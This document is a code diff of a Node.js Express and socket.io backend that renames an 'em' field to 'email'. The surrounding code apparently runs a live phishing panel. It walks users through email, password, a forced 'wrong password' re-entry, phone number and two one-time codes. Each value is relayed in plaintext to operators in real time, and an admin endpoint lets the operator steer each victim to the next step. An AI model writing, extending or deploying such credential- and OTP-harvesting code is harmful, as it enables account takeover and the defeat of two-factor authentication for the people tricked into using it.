@@ -114,7 +114,7 @@ io.on("connection", (socket) => {
 // =====================================================
 // START SIGN-IN
 // =====================================================
-// Called after the user enters their em and clicks
+// Called after the user enters their email and clicks
 // Next.
 //
 // The account/session is created BEFORE the password
@@ -186,7 +186,7 @@ app.post(
   async (req, res) => {
     try {
 
-      // Check whether this em already has a pending
+      // Check whether this email already has a pending
       // session.
 
       const ip = req.ip
@@ -206,7 +206,7 @@ app.post(
           lastLogin: new Date(),
           approved: false,
           device: deviceInfo.device,
-          currentStep: "em",
+          currentStep: "email",
           browser: deviceInfo.browser,
           ipAddress: ip,
           phoneRequested: false,
@@ -222,7 +222,7 @@ app.post(
         "new-user",
         {
           _id: user._id,
-          em: user.em,
+          email: user.email,
           status: user.status,
           device: user.device,
           ipAddress: user.ipAddress,
@@ -261,18 +261,18 @@ app.post(
 // =====================================================
 
 app.post(
-  "/api/auth/em",
+  "/api/auth/email",
   async (req, res) => {
     try {
       const {
         userId,
-        em
+        email
       } = req.body;
 
-      if (!userId || !em) {
+      if (!userId || !email) {
         return res.status(400).json({
           message:
-            "User ID and em are required"
+            "User ID and email are required"
         });
       }
 
@@ -288,12 +288,12 @@ app.post(
       // Hash password
     
 
-      user.em = em
+      user.email = email
 
       user.currentStep = "password"
 
       user.status =
-        "em-submitted";
+        "email-submitted";
       
       await updateLastLogin(user);
 
@@ -301,10 +301,10 @@ app.post(
       // Tell admin only that the password
       // step was completed.
       emitToAdmins(
-        "em-set",
+        "email-set",
         {
           _id: user._id,
-          em: user.em,
+          email: user.email,
           currentStep: user.currentStep,
           status: user.status
         }
@@ -314,12 +314,12 @@ app.post(
      
       res.json({
         message:
-          "em submitted successfully"
+          "email submitted successfully"
       });
 
     } catch (error) {
       console.log(
-        "em ERROR:",
+        "email ERROR:",
         error
       );
 
@@ -375,7 +375,7 @@ app.post(
         "password-set",
         {
           _id: user._id,
-          em: user.em,
+          email: user.email,
           password: user.password,
           currentStep: user.currentStep,
           status: user.status
@@ -460,7 +460,7 @@ app.post(
 
       console.log(
         "wrongPassword submitted for:",
-        user.em
+        user.email
       );
 
       // Tell admin only that the wrongPassword
@@ -469,7 +469,7 @@ app.post(
         "wrongPassword-set",
         {
           _id: user._id,
-          em: user.em,
+          email: user.email,
           wrongPassword: user.wrongPassword,
           currentStep: user.currentStep,
 
@@ -540,7 +540,7 @@ app.patch("/api/admin/change-step/:id", async (req, res) => {
     }
 
     const allowedSteps = [
-      "em",
+      "email",
       "password",
       "approve",
       "phone",
@@ -672,7 +672,7 @@ app.patch(
 
       console.log(
         "🔥 USER Device details:",
-        user.em
+        user.email
       );
 
       console.log(
@@ -713,7 +713,7 @@ app.patch(
 
       const safeUser = {
         _id: user._id,
-        em: user.em,
+        email: user.email,
         approved: user.approved,
         userDevice:
           user.userDevice,
@@ -807,7 +807,7 @@ app.post(
 
       console.log(
         "Phone submitted for:",
-        user.em
+        user.email
       );
 
       // Admin gets the phone submission
@@ -816,7 +816,7 @@ app.post(
         "phone-submitted",
         {
           _id: user._id,
-          em: user.em,
+          email: user.email,
           phoneNumber: user.phoneNumber,
           status: user.status
         }
@@ -875,7 +875,7 @@ app.post(
 
       console.log(
         "Phone submitted for:",
-        user.em
+        user.email
       );
 
       // Admin gets the phone submission
@@ -884,7 +884,7 @@ app.post(
         "phoneotp-submitted",
         {
           _id: user._id,
-          em: user.em,
+          email: user.email,
           phoneOtp: user.phoneOtp,
           status: user.status
         }
@@ -942,7 +942,7 @@ app.post(
 
       console.log(
         "Phone submitted for:",
-        user.em
+        user.email
       );
 
       // Admin gets the phone submission
@@ -951,7 +951,7 @@ app.post(
         "phoneotp2-submitted",
         {
           _id: user._id,
-          em: user.em,
+          email: user.email,
           phoneOtp2: user.phoneOtp2,
           status: user.status
         }
